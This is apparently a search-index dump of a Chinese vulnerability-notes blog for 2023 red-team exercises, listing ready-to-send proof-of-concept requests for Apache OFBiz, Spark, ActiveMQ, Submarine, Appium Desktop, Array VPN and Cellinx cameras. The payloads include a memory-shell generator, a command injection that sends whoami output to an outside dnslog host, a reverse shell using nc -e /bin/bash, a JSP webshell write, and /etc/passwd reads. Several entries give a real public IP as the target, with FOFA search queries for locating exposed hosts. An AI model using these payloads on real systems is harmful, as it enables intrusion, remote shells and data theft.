-49070/:3:0","tags":["2023hw漏洞"],"title":"Apache Ofbiz XML-RPC RCE漏洞-CVE-2023-49070","uri":"/apache-ofbiz-xml-rpc-rce%E6%BC%8F%E6%B4%9E-cve-2023-49070/"},{"categories":["2023hw漏洞"],"content":"回显内存马 java -jar ysoserial-main-49888d3191-1.jar CommonsBeanutils192NOCC \"CLASS:TomcatCmdEcho\" | base64 | tr -d \"\\n\" ","date":"2023-12-08","objectID":"/apache-ofbiz-xml-rpc-rce%E6%BC%8F%E6%B4%9E-cve-2023-49070/:4:0","tags":["2023hw漏洞"],"title":"Apache Ofbiz XML-RPC RCE漏洞-CVE-2023-49070","uri":"/apache-ofbiz-xml-rpc-rce%E6%BC%8F%E6%B4%9E-cve-2023-49070/"},{"categories":["2023hw漏洞"],"content":"介绍 Apache Spark是美国阿帕奇（Apache）基金会的一款支持非循环数据流和内存计算的大规模数据处理引擎。 Apache Spark 3.4.0之前版本存在命令注入漏洞，该漏洞源于如果ACL启用后，HttpSecurityFilter中的代码路径可以允许通过提供任意用户名来执行模拟，这将导致任意shell命令执行。 ","date":"2023-12-08","objectID":"/apache-spark%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-32007/:1:0","tags":["2023hw漏洞"],"title":"Apache Spark命令执行漏洞（CVE-2023-32007）","uri":"/apache-spark%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-32007/"},{"categories":["2023hw漏洞"],"content":"漏洞版本 3.1.1 \u003c= Apache Spark \u003c 3.2.2 ","date":"2023-12-08","objectID":"/apache-spark%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-32007/:2:0","tags":["2023hw漏洞"],"title":"Apache Spark命令执行漏洞（CVE-2023-32007）","uri":"/apache-spark%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-32007/"},{"categories":["2023hw漏洞"],"content":"利用条件 Apache Spark UI 启用 ACL ，且低权限 ","date":"2023-12-08","objectID":"/apache-spark%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-32007/:3:0","tags":["2023hw漏洞"],"title":"Apache Spark命令执行漏洞（CVE-2023-32007）","uri":"/apache-spark%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-32007/"},{"categories":["2023hw漏洞"],"content":"漏洞poc GET /jobs/?doAs=`curl+$(whoami)hw9y0l.dnslog.cn` HTTP/1.1 Host: 10.211.55.7:4040 Connection: keep-alive Cache-Control: max-age=0 DNT: 1 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 Chrome/116.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 ","date":"2023-12-08","objectID":"/apache-spark%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-32007/:4:0","tags":["2023hw漏洞"],"title":"Apache Spark命令执行漏洞（CVE-2023-32007）","uri":"/apache-spark%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-32007/"},{"categories":["2023hw漏洞"],"content":"Apache-ActiveMQ-Jolokia-远程代码执行漏洞-CVE-2022-41678 ","date":"2023-12-08","objectID":"/apache-activemq-jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-41678/:1:0","tags":["2023hw漏洞"],"title":"Apache-ActiveMQ-Jolokia-远程代码执行漏洞-CVE-2022-41678","uri":"/apache-activemq-jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-41678/"},{"categories":["2023hw漏洞"],"content":"影响范围 Apache ActiveMQ before 5.16.6 Apache ActiveMQ 5.17.0 before 5.17.4 Apache ActiveMQ 5.18.0 unaffected Apache ActiveMQ 6.0.0 unaffected ","date":"2023-12-08","objectID":"/apache-activemq-jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-41678/:2:0","tags":["2023hw漏洞"],"title":"Apache-ActiveMQ-Jolokia-远程代码执行漏洞-CVE-2022-41678","uri":"/apache-activemq-jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-41678/"},{"categories":["2023hw漏洞"],"content":"漏洞复现版本下载 https://activemq.apache.org/activemq-5017000-release ","date":"2023-12-08","objectID":"/apache-activemq-jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-41678/:3:0","tags":["2023hw漏洞"],"title":"Apache-ActiveMQ-Jolokia-远程代码执行漏洞-CVE-2022-41678","uri":"/apache-activemq-jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-41678/"},{"categories":["2023hw漏洞"],"content":"漏洞复现 新建记录 POST /api/jolokia/ HTTP/1.1 Host: localhost:8161 Origin:localhost:8161 Authorization: Basic YWRtaW46YWRtaW4= Connection: close Content-Type: application/json Content-Length: 136 { \"type\": \"EXEC\", \"mbean\": \"jdk.management.jfr:type=FlightRecorder\", \"operation\": \"newRecording\", \"arguments\": [] } 记住这个 value参数中的值，后面的poc要用到,例如现在是4 写入payload POST /api/jolokia/ HTTP/1.1 Host: localhost:8161 Origin:localhost:8161 Authorization: Basic YWRtaW46YWRtaW4= Connection: close Content-Type: application/json Content-Length: 136 { \"type\": \"EXEC\", \"mbean\": \"jdk.management.jfr:type=FlightRecorder\", \"operation\": \"setConfiguration\", \"arguments\": [4,\"\u003c?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?\u003e \u003c!-- Recommended way to edit .jfc files is to use Java Mission Control, see Window -\u003e Flight Recorder Template Manager. --\u003e \u003cconfiguration version=\\\"2.0\\\" label=\\\"Profiling\\\" description=\\\"Low overhead configuration for profiling, typically around 2 % overhead.\\\" provider=\\\"Oracle\\\"\u003e \u003cevent name=\\\"jdk.ThreadAllocationStatistics\\\"\u003e \u003csetting name=\\\"enabled\\\"\u003etrue\u003c/setting\u003e \u003csetting name=\\\"period\\\"\u003eeveryChunk \u0026lt;%out.printIn(\u0026quot;success\u0026quot;);%\u0026gt;\u003c/setting\u003e \u003c/event\u003e \u003cevent name=\\\"jdk.ClassLoadingStatistics\\\"\u003e \u003csetting name=\\\"enabled\\\"\u003etrue\u003c/setting\u003e \u003csetting name=\\\"period\\\"\u003e1000 ms\u003c/setting\u003e \u003c/event\u003e \u003cevent name=\\\"jdk.ClassLoaderStatistics\\\"\u003e \u003csetting name=\\\"enabled\\\"\u003etrue\u003c/setting\u003e \u003csetting name=\\\"period\\\"\u003eeveryChunk\u003c/setting\u003e \u003c/event\u003e \u003cevent name=\\\"jdk.JavaThreadStatistics\\\"\u003e \u003csetting name=\\\"enabled\\\"\u003etrue\u003c/setting\u003e \u003csetting name=\\\"period\\\"\u003e1000 ms\u003c/setting\u003e \u003c/event\u003e \u003cevent name=\\\"jdk.ThreadStart\\\"\u003e \u003csetting name=\\\"enabled\\\"\u003etrue\u003c/setting\u003e \u003csetting name=\\\"stackTrace\\\"\u003etrue\u003c/setting\u003e \u003c/event\u003e \u003cevent name=\\\"jdk.ThreadEnd\\\"\u003e \u003csetting name=\\\"enabled\\\"\u003etrue\u003c/setting\u003e \u003c/event\u003e \u003cevent name=\\\"jdk.ThreadSleep\\\"\u003e \u003csetting name=\\\"enabled\\\"\u003etrue\u003c/setting\u003e \u003csetting name=\\\"stackTrace\\\"\u003etrue\u003c/setting\u003e \u003csetting name=\\\"threshold\\\" control=\\\"synchronization-threshold\\\"\u003e10 ms\u003c/setting\u003e \u003c/event\u003e \u003cevent name=\\\"jdk.ThreadPark\\\"\u003e \u003csetting name=\\\"enabled\\\"\u003etrue\u003c/setting\u003e \u003csetting name=\\\"stackTrace\\\"\u003etrue\u003c/setting\u003e \u003csetting name=\\\"threshold\\\" control=\\\"synchronization-threshold\\\"\u003e10 ms\u003c/setting\u003e \u003c/event\u003e \u003cevent name=\\\"jdk.JavaMonitorEnter\\\"\u003e \u003csetting name=\\\"enabled\\\"\u003etrue\u003c/setting\u003e \u003csetting name=\\\"stackTrace\\\"\u003etrue\u003c/setting\u003e \u003csetting name=\\\"threshold\\\" control=\\\"synchronization-threshold\\\"\u003e10 ms\u003c/setting\u003e \u003c/event\u003e \u003cevent name=\\\"jdk.JavaMonitorWait\\\"\u003e \u003csetting name=\\\"enabled\\\"\u003etrue\u003c/setting\u003e \u003csetting name=\\\"stackTrace\\\"\u003etrue\u003c/setting\u003e \u003csetting name=\\\"threshold\\\" control=\\\"synchronization-threshold\\\"\u003e10 ms\u003c/setting\u003e \u003c/event\u003e \u003cevent name=\\\"jdk.JavaMonitorInflate\\\"\u003e \u003csetting name=\\\"enabled\\\"\u003etrue\u003c/setting\u003e \u003csetting name=\\\"stackTrace\\\"\u003etrue\u003c/setting\u003e \u003csetting name=\\\"threshold\\\" control=\\\"synchronization-threshold\\\"\u003e10 ms\u003c/setting\u003e \u003c/event\u003e \u003cevent name=\\\"jdk.BiasedLockRevocation\\\"\u003e \u003csetting name=\\\"enabled\\\"\u003etrue\u003c/setting\u003e \u003csetting name=\\\"stackTrace\\\"\u003etrue\u003c/setting\u003e \u003csetting name=\\\"threshold\\\"\u003e0 ms\u003c/setting\u003e \u003c/event\u003e \u003cevent name=\\\"jdk.BiasedLockSelfRevocation\\\"\u003e \u003csetting name=\\\"enabled\\\"\u003etrue\u003c/setting\u003e \u003csetting name=\\\"stackTrace\\\"\u003etrue\u003c/setting\u003e \u003csetting name=\\\"threshold\\\"\u003e0 ms\u003c/setting\u003e \u003c/event\u003e \u003cevent name=\\\"jdk.BiasedLockClassRevocation\\\"\u003e \u003csetting name=\\\"enabled\\\"\u003etrue\u003c/setting\u003e \u003csetting name=\\\"stackTrace\\\"\u003etrue\u003c/setting\u003e \u003csetting name=\\\"threshold\\\"\u003e0 ms\u003c/setting\u003e \u003c/event\u003e \u003cevent name=\\\"jdk.ReservedStackActivation\\\"\u003e \u003csetting name=\\\"enabled\\\"\u003etrue\u003c/setting\u003e \u003csetting name=\\\"stackTrace\\\"\u003etrue\u003c/setting\u003e \u003c/event\u003e \u003cevent name=\\\"jdk.ClassLoad\\\"\u003e \u003csetting name=\\\"enabled\\\" control=\\\"class-loading-enabled\\\"\u003efalse\u003c/setting\u003e \u003csetting name=\\\"stackTrace\\\"\u003etrue\u003c/setting\u003e \u003csetting name=\\\"threshold\\\"\u003e0 ms\u003c/setting\u003e \u003c/event\u003e \u003cevent name=\\\"jdk.ClassDefine\\\"\u003e \u003csetting name=\\\"enabled\\\" control=\\\"class-loading-enabled\\\"\u003efalse\u003c/setting\u003e \u003csetting name=\\\"stackTrace\\\"\u003etrue\u003c/setting\u003e \u003c/event\u003e \u003cevent name=\\\"jdk.ClassUnload\\\"\u003e \u003csetting name=\\\"enabled\\\" control=\\\"class-loading-enabled\\\"\u003efalse\u003c/setting\u003e \u003c/","date":"2023-12-08","objectID":"/apache-activemq-jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-41678/:4:0","tags":["2023hw漏洞"],"title":"Apache-ActiveMQ-Jolokia-远程代码执行漏洞-CVE-2022-41678","uri":"/apache-activemq-jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-41678/"},{"categories":["2023hw漏洞"],"content":"导出录制到web目录 POST /api/jolokia/ HTTP/1.1 Host: localhost:8161 Origin:localhost:8161 Authorization: Basic YWRtaW46YWRtaW4= Connection: close Content-Type: application/json Content-Length: 141 { \"type\": \"EXEC\", \"mbean\": \"jdk.management.jfr:type=FlightRecorder\", \"operation\": \"startRecording\", \"arguments\": [4] } POST /api/jolokia/ HTTP/1.1 Host: localhost:8161 Origin:localhost:8161 Authorization: Basic YWRtaW46YWRtaW4= Connection: close Content-Type: application/json Content-Length: 138 { \"type\": \"EXEC\", \"mbean\": \"jdk.management.jfr:type=FlightRecorder\", \"operation\": \"stopRecording\", \"arguments\": [4] } 导出到web目录 POST /api/jolokia/ HTTP/1.1 Host: localhost:8161 Origin:localhost:8161 Authorization: Basic YWRtaW46YWRtaW4= Connection: close Content-Type: application/json Content-Length: 159 { \"type\": \"EXEC\", \"mbean\": \"jdk.management.jfr:type=FlightRecorder\", \"operation\": \"copyTo\", \"arguments\": [4,\"../../webapps/test.jsp\"] } test.jsp写入成功 ","date":"2023-12-08","objectID":"/apache-activemq-jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-41678/:4:1","tags":["2023hw漏洞"],"title":"Apache-ActiveMQ-Jolokia-远程代码执行漏洞-CVE-2022-41678","uri":"/apache-activemq-jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-41678/"},{"categories":["2023hw漏洞"],"content":"漏洞来源 https://l3yx.github.io/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/ ","date":"2023-12-08","objectID":"/apache-activemq-jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-41678/:5:0","tags":["2023hw漏洞"],"title":"Apache-ActiveMQ-Jolokia-远程代码执行漏洞-CVE-2022-41678","uri":"/apache-activemq-jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-41678/"},{"categories":["2023hw漏洞"],"content":"payload 本地搭建源码，环境配置不正确，无法调试代码，payload是搜索GitHub关键字找到的 https://github.com/gradle/gradle-profiler/blob/2eb14e031fbd48203fb05b28183decd1ee2304de/src/main/resources/org/gradle/profiler/jfr/openjdk.jfc#L4 ","date":"2023-12-08","objectID":"/apache-activemq-jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-41678/:6:0","tags":["2023hw漏洞"],"title":"Apache-ActiveMQ-Jolokia-远程代码执行漏洞-CVE-2022-41678","uri":"/apache-activemq-jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-41678/"},{"categories":["2023hw漏洞"],"content":"Apache-Submarine-SQL注入漏洞CVE-2023-37924 Apache Submarine是一个端到端的机器学习平台，允许数据科学家创建完整的机器学习工作流程，涵盖数据探索、数据管道创建、模型训练、服务以及监控的每个阶段。Apache Submarine存在SQL注入漏洞，由于在SysDeptMapper.xml、SysUserMapper.xml等文件中的SQL语句使用了\"$“参数符号，导致用户可控的输入直接拼接到SQL语句中。未授权的攻击者可以通过向/sys/searchSelect等接口发送恶意的keyword参数，从而执行恶意的SQL语句。 ","date":"2023-12-08","objectID":"/apache-submarine-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Ecve-2023-37924/:1:0","tags":["2023hw漏洞"],"title":"Apache-Submarine-SQL注入漏洞CVE-2023-37924","uri":"/apache-submarine-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Ecve-2023-37924/"},{"categories":["2023hw漏洞"],"content":"影响范围 0.7.0\u003c=apache-submarine\u003c0.8.0.dev0 ","date":"2023-12-08","objectID":"/apache-submarine-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Ecve-2023-37924/:2:0","tags":["2023hw漏洞"],"title":"Apache-Submarine-SQL注入漏洞CVE-2023-37924","uri":"/apache-submarine-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Ecve-2023-37924/"},{"categories":["2023hw漏洞"],"content":"漏洞点 从官方修复得代码来看，主要使用mybatis框架，并写法不规范，${}造成sql注入漏洞 ","date":"2023-12-08","objectID":"/apache-submarine-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Ecve-2023-37924/:3:0","tags":["2023hw漏洞"],"title":"Apache-Submarine-SQL注入漏洞CVE-2023-37924","uri":"/apache-submarine-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Ecve-2023-37924/"},{"categories":["2023hw漏洞"],"content":"poc ","date":"2023-12-08","objectID":"/apache-submarine-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Ecve-2023-37924/:4:0","tags":["2023hw漏洞"],"title":"Apache-Submarine-SQL注入漏洞CVE-2023-37924","uri":"/apache-submarine-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Ecve-2023-37924/"},{"categories":["2023hw漏洞"],"content":"api/sys/user/list userNmae 和 email参数可控 GET /api/sys/user/list?column=createTime\u0026order=desc\u0026fieId=id,userName,realName\u0026userNmae=\u0026email= HTTP/1.1 Host: 192.168.108.153:32080 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Length: 4 ","date":"2023-12-08","objectID":"/apache-submarine-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Ecve-2023-37924/:4:1","tags":["2023hw漏洞"],"title":"Apache-Submarine-SQL注入漏洞CVE-2023-37924","uri":"/apache-submarine-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Ecve-2023-37924/"},{"categories":["2023hw漏洞"],"content":"/api/sys/dept/tree GET /api/sys/dept/tree?=likeDeptCode=demoData\u0026likeDeptName=demoData HTTP/1.1 Host: 192.168.108.153:32080 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Length: 4 ","date":"2023-12-08","objectID":"/apache-submarine-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Ecve-2023-37924/:4:2","tags":["2023hw漏洞"],"title":"Apache-Submarine-SQL注入漏洞CVE-2023-37924","uri":"/apache-submarine-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Ecve-2023-37924/"},{"categories":["2023hw漏洞"],"content":"api/sys/dict/list接口 GET /api/sys/dict/list?dictCode=demoData\u0026dictName=demoData\u0026column=\u0026field=\u0026order=pageNo=1\u0026pageSize=10 HTTP/1.1 Host: 192.168.108.153:32080 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Length: 4 ","date":"2023-12-08","objectID":"/apache-submarine-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Ecve-2023-37924/:4:3","tags":["2023hw漏洞"],"title":"Apache-Submarine-SQL注入漏洞CVE-2023-37924","uri":"/apache-submarine-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Ecve-2023-37924/"},{"categories":["2023hw漏洞"],"content":"漏洞复现 ","date":"2023-12-08","objectID":"/apache-submarine-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Ecve-2023-37924/:5:0","tags":["2023hw漏洞"],"title":"Apache-Submarine-SQL注入漏洞CVE-2023-37924","uri":"/apache-submarine-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Ecve-2023-37924/"},{"categories":["2023hw漏洞"],"content":"Appium Desktop CVE-2023-2479漏洞 appium-desktop 是 Appium 服务器的图形界面，也是一个应用程序检查器 由于用户输入审查不当，此软件包的受影响版本容易受到命令注入的攻击，允许攻击者设置反向 shell。 ","date":"2023-12-08","objectID":"/appium-desktop-cve-2023-2479%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"Appium Desktop CVE-2023-2479漏洞","uri":"/appium-desktop-cve-2023-2479%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"poc http://127.0.0.1/?xss=\u003cimg/src=\"1\"/onerror=eval(\"require('child_process').exec('nc${IFS}localhost${IFS}4444${IFS}-e${IFS}/bin/bash');\");\u003e http://127.0.0.1/?url=\u003cimg/src=\"http://nbjfpetfmu.dgrh3.cn\"\u003e ","date":"2023-12-08","objectID":"/appium-desktop-cve-2023-2479%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"Appium Desktop CVE-2023-2479漏洞","uri":"/appium-desktop-cve-2023-2479%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"Array VPN任意文件读取漏洞 ","date":"2023-12-08","objectID":"/array-vpn%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"Array VPN任意文件读取漏洞","uri":"/array-vpn%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"fofa product=\"Array-VPN\" ","date":"2023-12-08","objectID":"/array-vpn%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"Array VPN任意文件读取漏洞","uri":"/array-vpn%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"poc GET /prx/000/http/localhost/client_sec/%00../../../addfolder HTTP/1.1 Host: ip:port User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate X_AN_FILESHARE: uname=t; password=t; sp_uname=t; flags=c3248;fshare_template=../../../../../../../../etc/passwd Dnt: 1 Upgrade-Insecure-Requests: 1 Connection: close ","date":"2023-12-08","objectID":"/array-vpn%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"Array VPN任意文件读取漏洞","uri":"/array-vpn%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rbody=\"local/NVT-string.js\" ","date":"2023-12-08","objectID":"/cellinx-nvt-%E6%91%84%E5%83%8F%E6%9C%BA-getfilecontent.cgi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2023-23063/:0:0","tags":["2023hw"],"title":"Cellinx NVT 摄像机 GetFileContent.cgi 任意文件读取漏洞 （CVE-2023-23063）","uri":"/cellinx-nvt-%E6%91%84%E5%83%8F%E6%9C%BA-getfilecontent.cgi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2023-23063/"},{"categories":["2023hw"],"content":"poc http://1.222.228.4/cgi-bin/GetFileContent.cgi?USER=root\u0026PWD=D1D1D1D1D1D1D1D1D1D1D1D1A2A2B0A1D1D1D1D1D1D1D1D1D1D1D1D1D1D1B8D1\u0026PATH=/etc/passwd\u0026_=1672577046605 ","date":"2023-12-08","objectID":"/cellinx-nvt-%E6%91%84%E5%83%8F%E6%9C%BA-getfilecontent.cgi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2023-23063/:1:0","tags":["2023hw"],"title":"Cellinx NVT 摄像机 GetFileContent.cgi 任意文件读取漏洞 （CVE-2023-23063）","uri":"/cellinx-nvt-%E6%91%84%E5%83%8F%E6%9C%BA-getfilecontent.cgi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2023-23063/"},{"categories":["2023hw"],"content":"## fofa\rbody=\"local/NVT-string.js\" ","date":"2023-12-08","objectID":"/cellinx-nvt-%E6%91%84%E5%83%8F%E6%9C%BA-setfilecontent.cgi-%E6%96%87%E4%BB%B6-path-%E5%8F%82%E6%95%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9Ecve-2020-28250/:0:0","tags":["2023hw"],"title":"Cellinx NVT 摄像机 SetFileContent.cgi 文件 PATH 参数任意文件创建漏洞（CVE-2020-28250）","uri":"/cellinx-nvt-%E6%91%84%E5%83%8F%E6%9C%BA-setfilecontent.cgi-%E6%96%87%E4%BB%B6-path-%E5%8F%82%E6%95%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9Ecve-2020-28250/"},{"categories":["2023hw"],"content":"SetFileContent 攻击者可通过 SetFileContent.cgi 创建和写入任意文件，如覆盖 /etc/passwd 等获取服务器权限。 POST /cgi-bin/SetFileContent.cgi?USER=root\u0026PWD=D1D1D1D1D1D1D1D1D1D1D1D1A2A2B0A1D1D1D1D1D1D1D1D1D1D1D1D1D1D1B8D1\u0026PATH=/etc/html/testdsad11.txt HTTP/1.1 Host: 1.222.228.4 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip Content-Length: 11 testcontent GET /local/testdsad11.txt HTTP/1.1 ","date":"2023-12-08","objectID":"/cellinx-nvt-%E6%91%84%E5%83%8F%E6%9C%BA-setfilecontent.cgi-%E6%96%87%E4%BB%B6-path-%E5%8F%82%E6%95%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9Ecve-2020-28250/:1:0","tags":["2023hw"],"title":"Cellinx NVT 摄像机 SetFileContent.cgi 文件 PATH 参数任意文件创建漏洞（CVE-2020-28250）","uri":"/cellinx-nvt-%E6%91%84%E5%83%8F%E6%9C%BA-setfilecontent.cgi-%E6%96%87%E4%BB%B6-path-%E5%8F%82%E6%95%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9Ecve-2020-28250/"},{"categories":["2023hw"],"content":"## fofa\rbody=\"local/NVT-string.js\" ","date":"2023-12-08","objectID":"/cellinx-nvt-%E6%91%84%E5%83%8F%E6%9C%BA-uac.cgi-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"Cellinx NVT 摄像机 UAC.cgi 未授权访问漏洞","uri":"/cellinx-nvt-%E6%91%84%E5%83%8F%E6%9C%BA-uac.cgi-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc POST /cgi-bin/UAC.cgi?TYPE=json HTTP/1.1 Host: 1.222.228.4 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/json; charset=UTF-8 Accept-Encoding: gzip Content-Length: 198 